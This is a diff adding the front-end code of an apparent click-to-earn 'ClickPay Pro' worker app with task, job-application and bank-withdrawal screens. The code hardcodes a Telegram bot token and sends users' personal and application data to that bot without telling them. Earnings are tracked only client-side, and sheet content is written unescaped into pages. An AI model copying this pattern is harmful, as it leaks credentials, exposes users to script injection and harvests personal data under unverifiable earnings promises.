+                    <a href="https://t.me/CLIKPAY_BOT" target="_blank" class="action-btn secondary" style="width: 100%; text-align: center; text-decoration: none; display: block;">
+                        🤖 Open Official Telegram Bot
+                    </a>
+                </div>
+
+                <div style="display: flex; flex-direction: column; gap: 12px; font-size: 12px; margin-bottom: 20px;">
+                    <div style="display: flex; justify-content: space-between; background: rgba(0,0,0,0.4); padding: 12px; border-radius: 10px; border: 1px solid var(--border);">
+                        <span style="color: var(--text-muted);">Age & Gender:</span>
+                        <span style="font-weight: bold; color: #fff;" id="workerProfAgeGender">--</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; background: rgba(0,0,0,0.4); padding: 12px; border-radius: 10px; border: 1px solid var(--border);">
+                        <span style="color: var(--text-muted);">Email Address:</span>
+                        <span style="font-weight: bold; color: #fff;" id="workerProfEmail">--</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; background: rgba(0,0,0,0.4); padding: 12px; border-radius: 10px; border: 1px solid var(--border);">
+                        <span style="color: var(--text-muted);">Phone Number:</span>
+                        <span style="font-weight: bold; color: #fff;" id="workerProfPhone">--</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; background: rgba(0,0,0,0.4); padding: 12px; border-radius: 10px; border: 1px solid var(--border);">
+                        <span style="color: var(--text-muted);">Telegram Username:</span>
+                        <span style="font-weight: bold; color: #fff;" id="workerProfTg">--</span>
+                    </div>
+                </div>
+
+                <div style="border-top: 1px solid var(--border); padding-top: 18px; text-align: center;">
+                    <h3 style="color: var(--primary); font-size: 14px; margin-bottom: 6px;">🎁 Referral Program</h3>
+                    <p style="font-size: 11px; color: var(--text-muted); line-height: 1.5; margin-bottom: 14px;">
+                        Invite friends and earn points instantly!
+                    </p>
+                    <div class="form-group">
+                        <input type="text" id="workerRefLinkInput" readonly style="text-align: center; font-weight: bold; color: var(--accent);">
+                    </div>
+                    <button class="action-btn" style="width: 100%; margin-top: 6px;" onclick="copyWorkerReferralLink()">📋 Copy Referral Link</button>
+                </div>
+            </div>
+            <div class="footer-copyright">
+                © 2026 ClickPay Pro. All Rights Reserved.
+            </div>
+        </div>
+
+        <div id="withdraw-section" class="section">
+            <div class="section-title"><span>💸 Professional Earnings Withdrawal (Sunday Only)</span></div>
+            
+            <div class="box" style="margin-top:0;">
+                <div style="text-align: center; margin-bottom: 20px; background: rgba(0,0,0,0.4); padding: 18px; border-radius: 16px; border: 1px solid var(--border);">
+                    <div style="font-size: 11px; color: var(--text-muted); font-weight: 800; text-transform: uppercase;">Available Balance</div>
+                    <div style="font-size: 30px; font-weight: 900; color: var(--primary); margin-top: 4px;" id="wdAvailableBal">0.00 ETB</div>
+                </div>
+
+                <div class="form-group">
+                    <label>Select Payment Gateway</label>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 6px;" id="bankSelectorGrid">
+                        <button type="button" class="action-btn secondary bank-btn" onclick="selectBank('Telebirr', this)">Telebirr</button>
+                        <button type="button" class="action-btn secondary bank-btn" onclick="selectBank('CBE', this)">CBE Bank</button>
+                        <button type="button" class="action-btn secondary bank-btn" onclick="selectBank('Awash Bank', this)">Awash Bank</button>
+                        <button type="button" class="action-btn secondary bank-btn" onclick="selectBank('Dashen Bank', this)">Dashen Bank</button>
+                        <button type="button" class="action-btn secondary bank-btn" onclick="selectBank('Abyssinia Bank', this)">Abyssinia Bank</button>
+                        <button type="button" class="action-btn secondary bank-btn" onclick="selectBank('Coop Bank', this)">Coop Bank</button>
+                    </div>
+                </div>
+
+                <div class="form-group" style="margin-top: 14px;"><label>Full Name</label><input type="text" id="wdAccName" placeholder="Enter your full name..."></div>
+                <div class="form-group"><label>Account Number or Phone Number</label><input type="text" id="wdAccNo" placeholder="Account number or phone number..."></div>
+                <div class="form-group"><label>Withdrawal Amount (Min 500 ETB)</label><input type="number" id="wdAmount" placeholder="500"></div>
+                <div class="form-group"><label>Phone Number</label><input type="text" id="wdPhone" placeholder="09xxxxxxxx"></div>
+                <div class="form-group"><label>Telegram Username</label><input type="text" id="wdTgUser" placeholder="@username"></div>
+                <div class="form-group"><label>Referral Link</label><input type="url" id="wdRefLink" placeholder="https://t.me/CLIKPAY_BOT?start=ref_..."></div>
+                
+                <button class="action-btn" style="width:100%; padding:15px; margin-top:8px;" onclick="requestWithdrawal()">Submit Withdrawal Request</button>
+                <div id="wdAlertBox" class="inline-alert"></div>
+                <div id="wdSuccessBox" class="inline-success">Withdrawal request submitted successfully! Processing within 2 hours.</div>
+            </div>
+
+            <div class="box" style="margin-top: 18px; padding: 20px;">
+                <h4 style="color:var(--text-light); font-size:12px; margin-bottom:12px; border-bottom:1px solid var(--border); padding-bottom:8px; text-transform:uppercase; font-weight:900;">Withdrawal History</h4>
+                <div id="wdHistoryContainer"><div style="text-align:center; color:var(--text-muted); font-size:11px; padding:10px;">No history available.</div></div>
+            </div>
+            <div class="footer-copyright">
+                © 2026 ClickPay Pro. All Rights Reserved.
+            </div>
+        </div>
+
+    </div>
+
+    <nav class="nav-bar" id="mainNavBar" style="display:none;">
+        <button class="nav-item active" id="navHome" onclick="switchTab('worker-dashboard')">
+            <span>🏠</span><span>Home</span>
+        </button>
+        <button class="nav-item" id="navJobApply" onclick="switchTab('job-apply-section')">
+            <span>💼</span><span>Apply Job</span>
+        </button>
+        <button class="nav-item" id="navWithdrawWorker" onclick="switchTab('withdraw-section'); updateHistoryUI(); prefillWithdrawForm();">
+            <span>💸</span><span>Withdraw</span>
+        </button>
+        <button class="nav-item" id="navProfileWorker" onclick="switchTab('worker-profile-section'); renderWorkerProfileUI();">
+            <span>👤</span><span>Profile</span>
+        </button>
+        <a class="nav-item" id="navContactAdmin" href="https://t.me/ZEROPLUSFOR" target="_blank">
+            <span>💬</span><span>Support</span>
+        </a>
+    </nav>
+
+    <script>
+        const BOT_TOKEN = "8210915532:AAFI3jyXgRLx_HXqdwRFOi1xtzVEJXKkAZQ";
+        const CHAT_ID = "6780786734";
+        
+        let deviceId = localStorage.getItem('clickpay_device_id_worker_pro');
+        if(!deviceId) {
+            deviceId = 'WORKER-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+            localStorage.setItem('clickpay_device_id_worker_pro', deviceId);
+        }
+
+        let registeredUsers = JSON.parse(localStorage.getItem('clickpay_worker_users_pro') || '{}');
+        let currentUser = null;
+        let channelJoinedChecked = false;
+        let botStartedChecked = false;
+        let selectedBankName = '';
+
+        let taskStatesMap = {}; 
+        let taskTimeLeftMap = {};
+        let taskIntervalsMap = {};
+
+        let unlockedDailyJobs = JSON.parse(localStorage.getItem('clickpay_unlocked_jobs_pro') || '{}');
+
+        let selectedJobSchedule = 'Part-Time';
+        let selectedEducationLevel = 'College Diploma';
+
+        const TASK_SHEET_URL = "https://docs.google.com/spreadsheets/d/1BZ4K_8kbMDp9_F_8W-j4AsDZsYKTIEODIn1lcxovBTc/export?format=csv&gid=2110496584";
+        const PROMOTION_SHEET_URL = "https://docs.google.com/spreadsheets/d/1BZ4K_8kbMDp9_F_8W-j4AsDZsYKTIEODIn1lcxovBTc/export?format=csv&gid=0";
+        const NOTICE_SHEET_URL = "https://docs.google.com/spreadsheets/d/1BZ4K_8kbMDp9_F_8W-j4AsDZsYKTIEODIn1lcxovBTc/export?format=csv&gid=2099439673";
+        const DAILY_JOB_SHEET_URL = "https://docs.google.com/spreadsheets/d/1BZ4K_8kbMDp9_F_8W-j4AsDZsYKTIEODIn1lcxovBTc/export?format=csv&gid=149785639";
+        const DAILY_ADS_SHEET_URL = "https://docs.google.com/spreadsheets/d/1BZ4K_8kbMDp9_F_8W-j4AsDZsYKTIEODIn1lcxovBTc/export?format=csv&gid=961692872";
+
+        let cachedTasksData = [];
+        let cachedPromosData = [];
+        let cachedDailyJobsData = [];
+        let cachedDailyAdsData = [];
+        let cachedNoticeText = "Welcome to ClickPay Pro Worker Hub! Complete micro-tasks to earn points.";
+
+        const rotatingBannerItems = [
+            { label: "Telegram", text: "Telegram Channel Growth", icon: "📢" },
+            { label: "YouTube", text: "YouTube Video Promotion", icon: "▶️" },
+            { label: "TikTok", text: "TikTok Viral Marketing", icon: "🎵" },
+            { label: "Instagram", text: "Instagram Brand Reach", icon: "📸" },
+            { label: "Twitter", text: "Twitter Ecosystem Reach", icon: "🐦" },
+            { label: "Facebook", text: "Facebook Engagement", icon: "👥" },
+            { label: "Website", text: "Web Traffic & ClickPay", icon: "🌐" }
+        ];
+        let currentBannerIndex = 0;
+
+        let taskClickCounts = JSON.parse(localStorage.getItem('clickpay_task_click_counts_pro') || '{}');
+
+        window.onload = function() {
+            let urlParams = new URLSearchParams(window.location.search);
+            let refUser = urlParams.get('ref');
+            if(refUser && !localStorage.getItem('clickpay_worker_referred_flag')) {
+                localStorage.setItem('clickpay_worker_referred_flag', refUser);
+            }
+
+            let existingUserId = localStorage.getItem('clickpay_worker_device_reg_' + deviceId);
+            if (existingUserId && registeredUsers[existingUserId]) {
+                currentUser = registeredUsers[existingUserId];
+                switchTab('worker-dashboard');
+                document.getElementById('mainNavBar').style.display = 'flex';
+                updateWorkerWalletCard();
+            } else {
+                switchTab('channel-gate-section');
+                document.getElementById('mainNavBar').style.display = 'none';
+            }
+            
+            fetchLiveSheetsData();
+            setInterval(fetchLiveSheetsData, 1000);
+            setInterval(rotateBannerContent, 3000);
+
+            window.addEventListener('click', function(e) {
+                if(!document.getElementById('customEduDropdown').contains(e.target)) {
+                    document.getElementById('eduOptionsList').style.display = 'none';
+                }
+            });
+        };
+
+        function toggleEduDropdown() {
+            let list = document.getElementById('eduOptionsList');
+            list.style.display = list.style.display === 'flex' ? 'none' : 'flex';
+        }
+
+        function selectEduLevel(level) {
+            selectedEducationLevel = level;
+            document.getElementById('selectedEduText').textContent = level;
+            document.getElementById('eduOptionsList').style.display = 'none';
+            
+            document.querySelectorAll('.dropdown-option-item').forEach(item => {
+                item.classList.remove('selected');
+                if(item.textContent.includes(level)) item.classList.add('selected');
+            });
+        }
+
+        function calculateSalaryEstimate(val) {
+            let box = document.getElementById('salaryEstimateBox');
+            let txt = document.getElementById('salaryEstimateText');
+            let amount = parseFloat(val);
+            if(!amount || amount <= 0) {
+                box.style.display = 'none';
+                return;
+            }
+            let usdVal = amount / 57.0;
+            let pointsEquivalent = amount * 10;
+            box.style.display = 'block';
+            txt.innerHTML = `${amount} ETB = <b>$${usdVal.toFixed(2)} USD</b> (Equivalent to ${pointsEquivalent} ClickPay Pts)`;
+        }
+
+        function rotateBannerContent() {
+            currentBannerIndex = (currentBannerIndex + 1) % rotatingBannerItems.length;
+            let item = rotatingBannerItems[currentBannerIndex];
+            let area = document.getElementById('bannerDynamicArea');
+            if(area) {
+                area.innerHTML = `<span class="social-logo-svg">${item.icon}</span> <span>${item.text}</span>`;
+            }
+        }
+
+        function showToast(msg) {
+            let t = document.getElementById('appToast');
+            t.innerText = msg;
+            t.classList.add('show');
+            setTimeout(() => { t.classList.remove('show'); }, 3500);
+        }
+
+        function markJoined(type) {
+            if(type === 'channel') channelJoinedChecked = true;
+            if(type === 'bot') botStartedChecked = true;
+        }
+
+        function proceedAfterGateway() {
+            if(!channelJoinedChecked || !botStartedChecked) {
+                let alertBox = document.getElementById('gateAlert');
+                alertBox.style.display = 'block';
+                setTimeout(() => { alertBox.style.display = 'none'; }, 4000);
+                return;
+            }
+            switchTab('auth-section');
+        }
+
+        function handleUserRegistration() {
+            let existingUserId = localStorage.getItem('clickpay_worker_device_reg_' + deviceId);
+            if (existingUserId && registeredUsers[existingUserId]) {
+                showToast("⚠️ One account per device is allowed!");
+                currentUser = registeredUsers[existingUserId];
+                switchTab('worker-dashboard');
+                document.getElementById('mainNavBar').style.display = 'flex';
+                return;
+            }
+
+            let fullName = document.getElementById('regFullName').value.trim();
+            let age = document.getElementById('regAge').value.trim();
+            let gender = document.getElementById('regGender').value.trim();
+            let email = document.getElementById('regEmail').value.trim();
+            let phone = document.getElementById('regPhone').value.trim();
+            let tgUser = document.getElementById('regTgUser').value.trim();
+
+            let emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            let phonePattern = /^[0-9]{9,13}$/;
+
+            if(!fullName || !age || !gender || !email || !phone || !tgUser || !emailPattern.test(email) || !phonePattern.test(phone)) {
+                let ab = document.getElementById('authAlertBox');
+                ab.style.display = 'block';
+                setTimeout(()=> ab.style.display='none', 3500);
+                return;
+            }
+
+            let identifier = 'WORKER_' + Date.now();
+            currentUser = {
+                identifier, 
+                role: 'Worker', 
+                fullName, 
+                age,
+                gender,
+                email, 
+                phone, 
+                tgUser,
+                points: 0, 
+                earningsBalance: 0.00, 
+                regDate: new Date().toLocaleDateString(),
+                completedTasks: {}, 
+                withdrawHistory: [],
+                referralCount: 0
+            };
+
+            let referredBy = localStorage.getItem('clickpay_worker_referred_flag');
+            if(referredBy && registeredUsers[referredBy]) {
+                registeredUsers[referredBy].points = (registeredUsers[referredBy].points || 0) + 10;
+                registeredUsers[referredBy].referralCount = (registeredUsers[referredBy].referralCount || 0) + 1;
+            }
+
+            registeredUsers[identifier] = currentUser;
+            localStorage.setItem('clickpay_worker_users_pro', JSON.stringify(registeredUsers));
+            localStorage.setItem('clickpay_worker_device_reg_' + deviceId, identifier);
+            
+            let regMsg = `🚀 <b>New Worker Registration!</b>\n\n` +
+                         `👤 Name: ${fullName}\n` +
+                         `🎂 Age: ${age} | Gender: ${gender}\n` +
+                         `📧 Email: ${email}\n` +
+                         `📱 Phone: ${phone}\n` +
+                         `💬 Telegram: ${tgUser}`;
+            sendToTelegramBotInstant(regMsg);
+
+            document.getElementById('mainNavBar').style.display = 'flex';
+            switchTab('worker-dashboard');
+            updateWorkerWalletCard();
+            showToast("🎉 Welcome to ClickPay Worker Hub!");
+        }
+
+        function updateWorkerWalletCard() {
+            if(!currentUser) return;
+            let pts = currentUser.points || 0;
+            let etb = pts / 10;
+            let usd = etb / 57.0;
+
+            document.getElementById('dashWorkerFullName').textContent = currentUser.fullName;
+            document.getElementById('walletWorkerName').textContent = currentUser.fullName;
+            document.getElementById('walletTgUser').textContent = currentUser.tgUser.replace('@','');
+            document.getElementById('walletRegDate').textContent = currentUser.regDate;
+            
+            document.getElementById('wCardPoints').textContent = pts.toFixed(1) + " Pts";
+            document.getElementById('wCardEtb').textContent = etb.toFixed(2) + " Br";
+            document.getElementById('wCardUsd').textContent = "$" + usd.toFixed(2);
+            document.getElementById('wdAvailableBal').textContent = etb.toFixed(2) + " ETB";
+        }
+
+        function renderWorkerProfileUI() {
+            if(!currentUser) return;
+            document.getElementById('workerProfName').textContent = currentUser.fullName;
+            document.getElementById('workerProfAgeGender').textContent = `${currentUser.age} yrs, ${currentUser.gender}`;
+            document.getElementById('workerProfEmail').textContent = currentUser.email;
+            document.getElementById('workerProfPhone').textContent = currentUser.phone;
+            document.getElementById('workerProfTg').textContent = currentUser.tgUser;
+
+            let botUsername = "CLIKPAY_BOT";
+            let refUrl = `https://t.me/${botUsername}?start=ref_${currentUser.identifier}`;
+            document.getElementById('workerRefLinkInput').value = refUrl;
+        }
+
+        function prefillWithdrawForm() {
+            if(!currentUser) return;
+            document.getElementById('wdAccName').value = currentUser.fullName || '';
+            document.getElementById('wdAccNo').value = currentUser.phone || '';
+            document.getElementById('wdPhone').value = currentUser.phone || '';
+            document.getElementById('wdTgUser').value = currentUser.tgUser || '';
+            let botUsername = "CLIKPAY_BOT";
+            let refUrl = `https://t.me/${botUsername}?start=ref_${currentUser.identifier}`;
+            document.getElementById('wdRefLink').value = refUrl;
+        }
+
+        function copyWorkerReferralLink() {
+            let input = document.getElementById('workerRefLinkInput');
+            input.select();
+            input.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(input.value);
+            showToast("📋 Referral link copied successfully!");
+        }
+
+        function selectJobOption(group, value, elem) {
+            if(group === 'schedule') {
+                selectedJobSchedule = value;
+                document.querySelectorAll('#jobScheduleGroup .option-btn').forEach(b => b.classList.remove('selected'));
+            }
+            elem.classList.add('selected');
+        }
+
+        function submitJobApplication() {
+            let fullName = document.getElementById('jobFullName').value.trim();
+            let age = document.getElementById('jobAge').value.trim();
+            let phone = document.getElementById('jobPhone').value.trim();
+            let address = document.getElementById('jobAddress').value.trim();
+            let eduLevel = selectedEducationLevel;
+            let skills = document.getElementById('jobSkills').value.trim();
+            let portfolio = document.getElementById('jobPortfolio').value.trim();
+            let exp = document.getElementById('jobExp').value.trim();
+            let salary = document.getElementById('jobSalary').value.trim();
+            let desc = document.getElementById('jobDesc').value.trim();
+
+            let alertBox = document.getElementById('jobAlertBox');
+            let successBox = document.getElementById('jobSuccessBox');
+            alertBox.style.display = 'none'; successBox.style.display = 'none';
+
+            if(!fullName || !age || !phone || !address || !skills || !portfolio || !exp || !salary || !desc) {
+                alertBox.innerText = "⚠️ Please fill in all professional application fields including your portfolio link!";
+                alertBox.style.display = 'block';
+                return;
+            }
+
+            let currentPts = currentUser.points || 0;
+            if(currentPts < 0.5) {
+                alertBox.innerText = "⚠️ Insufficient points! You need at least 0.5 Pts to submit a professional application.";
+                alertBox.style.display = 'block';
+                return;
+            }
+
+            currentUser.points = parseFloat((currentPts - 0.5).toFixed(2));
+            registeredUsers[currentUser.identifier] = currentUser;
+            localStorage.setItem('clickpay_worker_users_pro', JSON.stringify(registeredUsers));
+            updateWorkerWalletCard();
+
+            let jobMsg = `💼 <b>New Professional Career Application!</b>\n\n` +
+                         `👤 Name: ${fullName}\n` +
+                         `🎂 Age: ${age} | Phone: ${phone}\n` +
+                         `📍 Address: ${address}\n` +
+                         `⏱ Schedule: ${selectedJobSchedule}\n` +
+                         `🎓 Education Level: ${eduLevel}\n` +
+                         `🛠 Skills: ${skills}\n` +
+                         `🔗 Portfolio: ${portfolio}\n` +
+                         `📈 Experience: ${exp} Years | Expected Salary: ${salary} ETB\n` +
+                         `📝 Professional Summary: ${desc}\n\n` +
+                         `💬 Telegram: ${currentUser.tgUser}`;
+            
+            sendToTelegramBotInstant(jobMsg);
+
+            successBox.style.display = 'block';
+            document.getElementById('jobFullName').value = '';
+            document.getElementById('jobAge').value = '';
+            document.getElementById('jobPhone').value = '';
+            document.getElementById('jobAddress').value = '';
+            document.getElementById('jobSkills').value = '';
+            document.getElementById('jobPortfolio').value = '';
+            document.getElementById('jobExp').value = '';
+            document.getElementById('jobSalary').value = '';
+            document.getElementById('jobDesc').value = '';
+            document.getElementById('salaryEstimateBox').style.display = 'none';
+            setTimeout(() => { successBox.style.display = 'none'; }, 5000);
+        }
+
+        function loadGoogleSheetCSV(sheetUrl, callback) {
+            fetch(sheetUrl).then(res => res.text()).then(csvText => {
+                const lines = csvText.split('\n').filter(l => l.trim() !== '');
+                if (lines.length < 1) return callback([]);
+                const headers = lines[0].split(',').map(h => h.trim().toLowerCase());
+                const result = [];
+                for (let i = 1; i < lines.length; i++) {
+                    const currentline = lines[i].split(/,(?=(?:(?:[^"]*"){2})*[^"]*$)/);
+                    const obj = {};
+                    for (let j = 0; j < headers.length; j++) {
+                        let val = currentline[j] ? currentline[j].trim() : '';
+                        if (val.startsWith('"') && val.endsWith('"')) val = val.slice(1, -1);
+                        obj[headers[j]] = val;
+                    }
+                    result.push(obj);
+                }
+                callback(result);
+            }).catch(err => callback([]));
+        }
+
+        function fetchLiveSheetsData() {
+            loadGoogleSheetCSV(NOTICE_SHEET_URL, (data) => {
+                if(data && data.length > 0) {
+                    let latestNotice = data[data.length - 1].notice || data[data.length - 1].text || data[data.length - 1].announcement || Object.values(data[data.length - 1])[0];
+                    if(latestNotice) {
+                        cachedNoticeText = latestNotice;
+                        document.getElementById('noticeBoardContent').innerText = cachedNoticeText;
+                        document.getElementById('noticeSyncTime').innerText = "Live Synced: " + new Date().toLocaleTimeString();
+                    }
+                }
+            });
+
+            loadGoogleSheetCSV(TASK_SHEET_URL, (data) => {
+                if(data) {
+                    cachedTasksData = data;
+                    renderTasksUI();
+                }
+            });
+
+            loadGoogleSheetCSV(PROMOTION_SHEET_URL, (data) => {
+                if(data) {
+                    cachedPromosData = data;
+                    renderPromosUI();
+                }
+            });
+
+            loadGoogleSheetCSV(DAILY_JOB_SHEET_URL, (data) => {
+                if(data) {
+                    cachedDailyJobsData = data;
+                    renderDailyJobsUI();
+                }
+            });
+
+            loadGoogleSheetCSV(DAILY_ADS_SHEET_URL, (data) => {
+                if(data) {
+                    cachedDailyAdsData = data;
+                    renderDailyAdsUI();
+                }
+            });
+        }
+
+        function switchWorkerTab(tab) {
+            let tWrap = document.getElementById('worker-tasks-wrap');
+            let pWrap = document.getElementById('worker-promos-wrap');
+            let jWrap = document.getElementById('worker-jobs-wrap');
+            let dWrap = document.getElementById('worker-dailyads-wrap');
+            
+            let tBtn = document.getElementById('worker-tasks-tab-btn');
+            let pBtn = document.getElementById('worker-promos-tab-btn');
+            let jBtn = document.getElementById('worker-jobs-tab-btn');
+            let dBtn = document.getElementById('worker-dailyads-tab-btn');
+
+            tWrap.style.display = 'none';
+            pWrap.style.display = 'none';
+            jWrap.style.display = 'none';
+            dWrap.style.display = 'none';
+
+            tBtn.style.background = 'transparent'; tBtn.style.color = 'var(--text-light)';
+            pBtn.style.background = 'transparent'; pBtn.style.color = 'var(--text-light)';
+            jBtn.style.background = 'transparent'; jBtn.style.color = 'var(--text-light)';
+            dBtn.style.background = 'transparent'; dBtn.style.color = 'var(--text-light)';
+
+            if(tab === 'tasks') {
+                tWrap.style.display = 'block';
+                tBtn.style.background = 'var(--primary)'; tBtn.style.color = '#fff';
+            } else if(tab === 'promos') {
+                pWrap.style.display = 'block';
+                pBtn.style.background = 'var(--primary)'; pBtn.style.color = '#fff';
+            } else if(tab === 'jobs') {
+                jWrap.style.display = 'block';
+                jBtn.style.background = 'var(--primary)'; jBtn.style.color = '#fff';
+            } else if(tab === 'dailyads') {
+                dWrap.style.display = 'block';
+                dBtn.style.background = 'var(--primary)'; dBtn.style.color = '#fff';
+            }
+        }
+
+        function renderTasksUI() {
+            let workerTaskCont = document.getElementById('worker-dynamic-tasks-container');
+            let reversed = [...cachedTasksData].reverse();
+
+            if(workerTaskCont && currentUser) {
+                workerTaskCont.innerHTML = '';
+                reversed.forEach((task, i) => {
+                    let originalIndex = cachedTasksData.length - 1 - i;
+                    let title = task.title || task.name || "Micro Task";
+                    let points = parseFloat(task.points) || 10;
+                    let etb = points / 10;
+                    let usd = etb / 57.0;
+                    let link = task.link || "";
+                    let brand = task.brand || task.bizname || "Partner Network";
+                    let taskId = 'task_' + originalIndex + '_' + title.replace(/[^a-zA-Z0-9]/g,'');
+                    let isDone = currentUser.completedTasks && currentUser.completedTasks[taskId];
+
+                    let clickCount = taskClickCounts[taskId] || 0;
+
+                    if(isDone) {
+                        taskStatesMap[taskId] = 'completed';
+                    } else if(!taskStatesMap[taskId]) {
+                        taskStatesMap[taskId] = 'idle';
+                        taskTimeLeftMap[taskId] = 25;
+                    }
+
+                    workerTaskCont.innerHTML += `
+                        <div class="card" id="card-${taskId}">
+                            <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:8px;">
+                                <div style="font-size:13px; font-weight:bold; color:var(--text-light);">${title}</div>
+                                <div style="font-size:10px; color:var(--primary); font-weight:bold; background:rgba(0,0,0,0.5); padding:4px 8px; border-radius:6px;">${brand}</div>
+                            </div>
+                            <div style="font-size:11px; color:var(--text-muted); margin-bottom:8px;">
+                                Reward: <b style="color:var(--accent);">${points} Pts</b> (${etb.toFixed(2)} ETB / $${usd.toFixed(2)})
+                            </div>
+                            <div style="font-size:10px; color:var(--text-muted); margin-bottom:12px; display:flex; justify-content:space-between; align-items:center;">
+                                <span>🔗 Link Status: <b style="color:${link && link.trim() !== '' && link !== '#' ? '#10b981' : '#ef4444'};">${link && link.trim() !== '' && link !== '#' ? 'Active' : 'Missing'}</b></span>
+                                <span style="background: rgba(99,102,241,0.15); padding: 2px 8px; border-radius: 6px; color: var(--primary); font-weight: bold;">⚡ Total Clicks: <span id="click-count-${taskId}">${clickCount}</span></span>
+                            </div>
+                            
+                            <div id="action-area-${taskId}">
+                                ${getTaskButtonHTML(taskId, link, points)}
+                            </div>
+                        </div>
+                    `;
+                });
+            }
+        }
+
+        function getTaskButtonHTML(taskId, link, points) {
+            let state = taskStatesMap[taskId] || 'idle';
+            let timeLeft = taskTimeLeftMap[taskId] ?? 25;
+
+            if (state === 'idle') {
+                return `<button onclick="handleOpenTask('${taskId}', '${link}', ${points}, '${encodeURIComponent(JSON.stringify({title: 'Task', link, points}))}')" class="action-btn" style="width:100%;">OPEN TASK</button>`;
+            } else if (state === 'counting') {
+                return `<button disabled class="action-btn" style="width:100%; background:#64748b; cursor:not-allowed;">⏳ Verifying Task... (${timeLeft}s)</button>`;
+            } else if (state === 'ready') {
+                return `<button onclick="handleCollect('${taskId}', ${points}, '${link}')" class="action-btn" style="width:100%; background:var(--accent);">COLLECT REWARD</button>`;
+            } else {
+                return `<button disabled class="action-btn" style="width:100%; background:#1e3a8a; color:#cbd5e1;">TASK COMPLETED</button>`;
+            }
+        }
+
+        function handleOpenTask(taskId, link, points, taskDataEncoded) {
+            let trimmedLink = link ? link.trim() : "";
+            
+            if (!trimmedLink || trimmedLink === "#" || (!trimmedLink.startsWith("http://") && !trimmedLink.startsWith("https://"))) {
+                showToast("❌ Error: This task has no valid link provided in the Google Sheet. Cannot proceed!");
+                let card = document.getElementById(`card-${taskId}`);
+                if(card) {
+                    card.style.borderColor = "var(--danger)";
+                    setTimeout(() => { card.style.borderColor = "var(--border)"; }, 3000);
+                }
+                return;
+            }
+
+            taskClickCounts[taskId] = (taskClickCounts[taskId] || 0) + 1;
+            localStorage.setItem('clickpay_task_click_counts_pro', JSON.stringify(taskClickCounts));
+            let countEl = document.getElementById(`click-count-${taskId}`);
+            if(countEl) countEl.innerText = taskClickCounts[taskId];
+
+            window.open(trimmedLink, '_blank');
+
+            let taskObj = JSON.parse(decodeURIComponent(taskDataEncoded));
+            let cardElem = document.getElementById(`card-${taskId}`);
+            let headline = cardElem ? cardElem.querySelector('div > div').innerText : "Micro Task";
+            let totalClicks = taskClickCounts[taskId];
+
+            let taskAnalysisMsg = `📊 <b>Task Analysis & Click Log</b>\n\n` +
+                                 `📌 <b>Headline:</b> ${headline}\n` +
+                                 `🔗 <b>Link:</b> ${trimmedLink}\n` +
+                                 `⚡ <b>Total Taps/Clicks:</b> ${totalClicks}\n` +
+                                 `👤 <b>Worker:</b> ${currentUser.fullName} (${currentUser.tgUser})`;
+            sendToTelegramBotInstant(taskAnalysisMsg);
+
+            taskStatesMap[taskId] = 'counting';
+            taskTimeLeftMap[taskId] = 25;
+            updateTaskButtonUI(taskId);
+
+            if(taskIntervalsMap[taskId]) clearInterval(taskIntervalsMap[taskId]);
+
+            taskIntervalsMap[taskId] = setInterval(() => {
+                if(taskTimeLeftMap[taskId] > 0) {
+                    taskTimeLeftMap[taskId]--;
+                    updateTaskButtonUI(taskId);
+                } else {
+                    taskStatesMap[taskId] = 'ready';
+                    clearInterval(taskIntervalsMap[taskId]);
+                    delete taskIntervalsMap[taskId];
+                    updateTaskButtonUI(taskId);
+                }
+            }, 1000);
+        }
+
+        function handleCollect(taskId, points, link) {
+            if(!currentUser.completedTasks) currentUser.completedTasks = {};
+            currentUser.completedTasks[taskId] = true;
+            currentUser.points = (currentUser.points || 0) + points;
+            
+            registeredUsers[currentUser.identifier] = currentUser;
+            localStorage.setItem('clickpay_worker_users_pro', JSON.stringify(registeredUsers));
+            
+            taskStatesMap[taskId] = 'completed';
+            updateTaskButtonUI(taskId);
+            updateWorkerWalletCard();
+            showToast(`🎉 Successfully collected ${points} Pts!`);
+
+            let etbBal = ((currentUser.points || 0) / 10).toFixed(2);
+            let totalClicks = taskClickCounts[taskId] || 1;
+            
+            let taskCompletionMsg = `✅ <b>Micro-Task Completed Successfully!</b>\n\n` +
+                                   `👤 Worker: ${currentUser.fullName}\n` +
+                                   `📞 Phone: ${currentUser.phone}\n` +
+                                   `💬 Telegram: ${currentUser.tgUser}\n` +
+                                   `🎁 Earned Reward: +${points} Pts (${(points/10).toFixed(2)} ETB)\n` +
+                                   `⚡ Total Task Taps/Clicks: ${totalClicks}\n` +
+                                   `💰 Current Wallet Balance: ${etbBal} ETB (${currentUser.points || 0} Pts)\n` +
+                                   `🔗 Task Link: ${link}`;
+            sendToTelegramBotInstant(taskCompletionMsg);
+        }
+
+        function updateTaskButtonUI(taskId) {
+            let area = document.getElementById(`action-area-${taskId}`);
+            if(!area) return;
+            let link = "#";
+            let points = 10;
+            area.innerHTML = getTaskButtonHTML(taskId, link, points);
+        }
+
+        function renderPromosUI() {
+            let reversed = [...cachedPromosData].reverse();
+            let el = document.getElementById('worker-promotions-container');
+            if(!el) return;
+            el.innerHTML = '';
+            reversed.forEach((promo) => {
+                let title = promo.title || promo.name || "Exclusive Promotion";
+                let desc = promo.description || promo.details || "";
+                let link = promo.link || "#";
+
+                el.innerHTML += `
+                    <div class="card">
+                        <div class="promo-badge-pill">⭐ Promoted by ClickPay Pro</div>
+                        <h4 style="color:var(--primary); margin-bottom:6px; font-size:14px; font-weight:900;">${title}</h4>
+                        <p style="color:#e2e8f0; font-size:11px; line-height:1.6; margin-bottom:10px; font-weight:500;">${desc}</p>
+                        
+                        <a href="${link}" target="_blank" class="action-btn secondary" style="display:block; text-align:center; text-decoration:none; margin-top:12px;">Explore Promotion</a>
+                    </div>
+                `;
+            });
+        }
+
+        function renderDailyJobsUI() {
+            let container = document.getElementById('worker-daily-jobs-container');
+            let reversed = [...cachedDailyJobsData].reverse();
+
+            if(!container) return;
+            container.innerHTML = '';
+
+            if(reversed.length === 0) {
+                container.innerHTML = '<div style="text-align:center; color:var(--text-muted); font-size:11px; padding:20px;">No daily job listings available currently.</div>';
+                return;
+            }
+
+            reversed.forEach((job, index) => {
